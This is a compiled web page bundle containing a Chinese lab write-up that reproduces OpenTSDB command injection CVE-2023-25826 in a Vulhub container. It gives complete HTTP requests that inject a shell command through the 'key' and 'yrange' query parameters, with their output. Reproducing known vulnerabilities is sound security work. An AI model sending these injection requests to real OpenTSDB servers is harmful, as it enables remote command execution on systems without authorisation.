import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as p,o as i,c as o,a,b as s,d as n,e as l}from"./app-58e4a7d6.js";const r={},c=a("h2",{id:"漏洞描述",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),d=a("p",null,"OpenTSDB 是一款基于 Hbase 的、分布式的、可伸缩的时间序列数据库。 2.4.1 版本及之前，存在一处命令注入漏洞。 这个漏洞其实是对之前的 CVE-2020-35476 修复不完善导致的，所以整个复现过程也与之前类似。",-1),m=a("p",null,"参考链接：",-1),u={href:"https://www.synopsys.com/blogs/software-security/opentsdb/",target:"_blank",rel:"noopener noreferrer"},b={href:"https://github.com/OpenTSDB/opentsdb/pull/2275",target:"_blank",rel:"noopener noreferrer"},v=l(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 OpenTSDB 2.4.1：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，访问<code>http://your-ip:4242</code>即可看到 OpenTSDB 的 Web 接口。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240307171841166.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>这之前的都和 CVE-2020-35476 一致，也是需要知道一个 metric 的名字，可以通过<code>http://your-ip:4242/api/suggest?type=metrics&amp;q=&amp;max=10</code>查看 metric 列表。</p><p>这里的 metric 列表是空的。但当前 OpenTSDB 开启了自动创建 metric 功能（<code>tsd.core.auto_create_metrics = true</code>），所以也可以使用如下 API 创建一个名为<code>sys.cpu.nice</code>的 metric 并添加一条记录：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /api/put/ HTTP/1.1
Host: your-ip:4242
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 150

{
    &quot;metric&quot;: &quot;sys.cpu.nice&quot;,
    &quot;timestamp&quot;: 972388800,
    &quot;value&quot;: 20,
    &quot;tags&quot;: {
       &quot;host&quot;: &quot;web01&quot;,
       &quot;dc&quot;: &quot;lga&quot;
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240307171931111.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>如果目标 OpenTSDB 存在 metric，且不为空，则无需上述步骤。</p><p>发送 CVE-2020-35476 payload ：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /q?start=2000/10/21-00:00:00&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[0:system(%27touch%20/tmp/awesome_poc%27)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json HTTP/1.1
Host: your-ip:4242
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>将返回错误：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>{&quot;err&quot;:&quot;&#39;yrange&#39; was invalid. Must be in the format [min:max].&quot;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240307172116456.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>CVE-2023-25826 绕过修复的一个点，在参数 key 这里：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># CVE-2020-35476</span>
/q?start<span class="token operator">=</span><span class="token number">2000</span>/10/21-00:00:00<span class="token operator">&amp;</span><span class="token assign-left variable">m</span><span class="token operator">=</span>sum:sys.cpu.nice<span class="token operator">&amp;</span><span class="token assign-left variable">o</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token assign-left variable">ylabel</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token assign-left variable">xrange</span><span class="token operator">=</span><span class="token number">10</span>:10<span class="token operator">&amp;</span><span class="token assign-left variable">yrange</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span>:system<span class="token punctuation">(</span>%27touch%20/tmp/awesome_poc%27<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token assign-left variable">wxh</span><span class="token operator">=</span>1516x644<span class="token operator">&amp;</span><span class="token assign-left variable">style</span><span class="token operator">=</span>linespoint<span class="token operator">&amp;</span><span class="token assign-left variable">baba</span><span class="token operator">=</span>lala<span class="token operator">&amp;</span><span class="token assign-left variable">grid</span><span class="token operator">=</span>t<span class="token operator">&amp;</span>json

<span class="token comment"># CVE-2023-25826</span>
/q?start<span class="token operator">=</span><span class="token number">2000</span>/10/21-00:00:00<span class="token operator">&amp;</span><span class="token assign-left variable">m</span><span class="token operator">=</span>sum:sys.cpu.nice<span class="token operator">&amp;</span><span class="token assign-left variable">o</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token assign-left variable">ylabel</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">xrange</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token assign-left variable">y2range</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">42</span>:42<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token assign-left variable">key</span><span class="token operator">=</span>%3Bsystem%20%22touch%20/tmp/awesome_poc%22%20%22<span class="token operator">&amp;</span><span class="token assign-left variable">wxh</span><span class="token operator">=</span>1516x644<span class="token operator">&amp;</span><span class="token assign-left variable">style</span><span class="token operator">=</span>linespoint<span class="token operator">&amp;</span><span class="token assign-left variable">baba</span><span class="token operator">=</span>lala<span class="token operator">&amp;</span><span class="token assign-left variable">grid</span><span class="token operator">=</span>t<span class="token operator">&amp;</span>json
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>发送数据包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /q?start=2000/10/21-00:00:00&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=1&amp;xrange=&amp;y2range=[42:42]&amp;key=%3Bsystem%20%22touch%20/tmp/awesome_poc%22%20%22&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json HTTP/1.1
Host: your-ip:4242
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240307172238155.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>进入容器中可见 <code>touch /tmp/awesome_poc</code> 已成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240307172321376.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,23);function g(k,h){const e=p("ExternalLinkIcon");return i(),o("div",null,[c,d,m,a("ul",null,[a("li",null,[a("a",u,[s("https://www.synopsys.com/blogs/software-security/opentsdb/"),n(e)])]),a("li",null,[a("a",b,[s("OpenTSDB/opentsdb#2275"),n(e)])])]),v])}const y=t(r,[["render",g],["__file","OpenTSDB 命令注入漏洞 CVE-2023-25826.html.vue"]]);export{y as default};
